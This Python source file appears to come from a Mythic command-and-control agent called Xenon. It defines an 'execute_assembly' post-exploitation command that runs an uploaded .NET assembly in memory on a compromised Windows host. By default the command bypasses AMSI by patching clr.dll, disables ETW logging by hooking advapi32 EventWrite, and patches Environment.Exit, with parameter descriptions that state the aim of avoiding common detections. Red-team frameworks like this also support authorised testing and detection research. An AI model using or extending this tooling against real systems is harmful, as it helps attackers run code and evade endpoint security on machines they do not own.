from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from ..utils.packer import serialize_int, serialize_bool, serialize_string
import logging, sys
import os
import tempfile
from .utils.bof_utilities import *
from .utils.crystal_utilities import *
import base64

logging.basicConfig(level=logging.INFO)


class ExecuteAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="assembly_name",
                cli_name="Assembly",
                display_name="Assembly",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_files,
                description="Already existing .NET assembly to execute (e.g. SharpUp.exe)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1
                    )
                ]),
            CommandParameter(
                name="assembly_file",
                display_name="New Assembly",
                type=ParameterType.File,
                description="A new .NET assembly to execute. After uploading once, you can just supply the -Assembly parameter",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True, 
                        group_name="New Assembly", 
                        ui_position=1,
                    )
                ]
            ),
            CommandParameter(
                name="assembly_arguments",
                cli_name="Arguments",
                display_name="Arguments",
                type=ParameterType.String,
                description="Arguments to pass to the assembly.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=2,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=2
                    ),
                ],
            ),
            CommandParameter(
                name="patch_exit",
                cli_name="-patchexit",
                display_name="patchexit",
                type=ParameterType.Boolean,
                description="Patches System.Environment.Exit to prevent Beacon process from exiting",
                default_value=True,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=3,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=3
                    ),
                ],
            ),
            CommandParameter(
                name="amsi",
                cli_name="-amsi",
                display_name="amsi",
                type=ParameterType.Boolean,
                description="Bypass AMSI by patching clr.dll instead of amsi.dll to avoid common detections",
                default_value=True,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=4,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=4
                    ),
                ],
            ),
            CommandParameter(
                name="etw",
                cli_name="-etw",
                display_name="etw",
                type=ParameterType.Boolean,
                description="Bypass ETW by EAT Hooking advapi32.dll!EventWrite to point to a function that returns right away",
                default_value=True,
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False, group_name="Default", ui_position=5,
                    ),
                    ParameterGroupInfo(
                        required=False, group_name="New Assembly", ui_position=5
                    ),
                ],
            )
        ]
    
    async def get_files(self, callback: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        response = PTRPCDynamicQueryFunctionMessageResponse()
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=callback.Callback,
            LimitByCallback=False,
            Filename="",
        ))
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".exe"):
                    file_names.append(f.Filename)
            response.Success = True
            response.Choices = file_names
            return response
        else:
            await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                CallbackId=callback.Callback,
                Message=f"Failed to get files: {file_resp.Error}",
                MessageLevel="warning"
            ))
            response.Error = f"Failed to get files: {file_resp.Error}"
            return response


    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception(
                "Require an assembly to execute.\n\tUsage: {}".format(
                    ExecuteAssemblyCommand.help_cmd
                )
            )
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split(" ", maxsplit=1)
            self.add_arg("assembly_name", parts[0])
            if len(parts) == 2:
                self.add_arg("assembly_arguments", parts[1])
            else:
                self.add_arg("assembly_arguments", "")


class ExecuteAssemblyCommand(CoffCommandBase):
    cmd = "execute_assembly"
    needs_admin = False
    help_cmd = "execute_assembly -File [Assmbly Filename] [-Arguments [optional arguments]]"
    description = "Execute a .NET Assembly. Use an already uploaded assembly file or upload one with the command. (e.g., execute_assembly -File SharpUp.exe -Arguments \"audit\")"
    version = 1
    author = "@c0rnbread"
    script_only = True
    attackmapping = []
    argument_class = ExecuteAssemblyArguments
    attributes = CommandAttributes(
        builtin=False,
        dependencies=["inline_execute", "inject_shellcode"],
        supported_os=[ SupportedOS.Windows ],
        suggested_command=True
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        try:
            ######################################
            #                                    #
            #   Group (New Assembly | Default)   #
            #                                    #
            ######################################
            groupName = taskData.args.get_parameter_group_name()
            
            if groupName == "New Assembly":
                file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=taskData.Task.ID,
                    AgentFileID=taskData.args.get_arg("assembly_file")
                ))
                if file_resp.Success:
                    if len(file_resp.Files) > 0:
                        pass
                    else:
                        raise Exception("Failed to find that file")
                else:
                    raise Exception("Error from Mythic trying to get file: " + str(file_resp.Error))
                                
                taskData.args.add_arg("assembly_name", file_resp.Files[0].Filename)
                taskData.args.remove_arg("assembly_file")
            
            elif groupName == "Default":
                # We're trying to find an already existing file and use that
                file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=taskData.Task.ID,
                    Filename=taskData.args.get_arg("assembly_name"),
                    LimitByCallback=False,
                    MaxResults=1
                ))
                if file_resp.Success:
                    if len(file_resp.Files) > 0:
                        logging.info(f"Found existing Assembly with File ID : {file_resp.Files[0].AgentFileId}")

                        taskData.args.remove_arg("assembly_name")    # Don't need this anymore

                    elif len(file_resp.Files) == 0:
                        raise Exception("Failed to find the named file. Have you uploaded it before? Did it get deleted?")
                else:
                    raise Exception("Error from Mythic trying to search files:\n" + str(file_resp.Error))

            # Set display parameters
            response.DisplayParams = "{} {} {} {} {}".format(
                file_resp.Files[0].Filename,
                taskData.args.get_arg("assembly_arguments"),
                "--patchexit" if taskData.args.get_arg("patch_exit") else "",
                "--amsi" if taskData.args.get_arg("amsi") else "",
                "--etw" if taskData.args.get_arg("etw") else "",
            )

            # TODO
            # Check if execute_assembly DLL capability is compiled
            #            
            #   /root/Xenon/Payload_Type/xenon/xenon/agent_code/Modules/bin/execute_assembly.x64.dll
            
            # Upload desired module if it hasn't been before (per payload uuid)
            file_name = "execute_assembly.x64.dll"
            succeeded = await upload_module_if_missing(file_name=file_name, taskData=taskData)
            if not succeeded:
                response.Success = False
                response.Error = f"Failed to upload or check module \"{file_name}\"."
            
            #
            # Pack data for Post-Ex DLL
            #
            
            # Args
            assembly_args = taskData.args.get_arg("assembly_arguments")
            is_patchexit = taskData.args.get_arg("patch_exit")
            is_patchamsi = taskData.args.get_arg("amsi")
            is_patchetw = taskData.args.get_arg("etw")
            
            # Get .NET assembly bytes
            file_content_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(AgentFileId=file_resp.Files[0].AgentFileId))
            if not file_content_resp.Success:
                raise Exception("Failed to fetch find file from Mythic (ID: {})".format(file_resp.Files[0].AgentFileId))
            assembly_bytes = file_content_resp.Content
            assembly_len = len(assembly_bytes)
            # Arguments passed to .NET Assembly
            args_bytes = (assembly_args or "").encode("utf-16-le") + b"\x00\x00"
            args_len = len(args_bytes)
            
            dll_arguments = struct.pack("<I", assembly_len) + assembly_bytes + struct.pack("<I", args_len) + args_bytes
            
            # Execute Post-Ex DLL
            subtask = await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    taskData.Task.ID,
                    CommandName="execute_dll",
                    SubtaskCallbackFunction="coff_completion_callback",
                    Params=json.dumps({
                        "dll_name": file_name,
                        "dll_arguments_encoded": base64.b64encode(dll_arguments).decode("utf-8")
                    }),
                    Token=taskData.Task.TokenID,
                )
            )
            
            # Debugging
            # logging.info(taskData.args.to_json())
            
            return response

        except Exception as e:
            raise Exception("Error from Mythic: " + str(sys.exc_info()[-1].tb_lineno) + " : " + str(e))
        

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp